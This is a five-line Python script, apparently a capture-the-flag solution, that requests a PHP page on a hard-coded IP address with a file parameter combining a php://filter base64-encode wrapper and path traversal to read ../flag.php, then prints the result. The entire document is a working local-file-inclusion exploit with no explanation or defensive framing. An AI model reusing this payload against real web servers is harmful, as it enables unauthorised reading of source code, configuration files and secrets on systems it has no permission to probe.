import requests
url = 'http://119.29.138.57:12001/show.php?file=\
php://filter/read=convert.base64-encode/resource=../flag.php'
re = requests.get(url)
print(re.text)
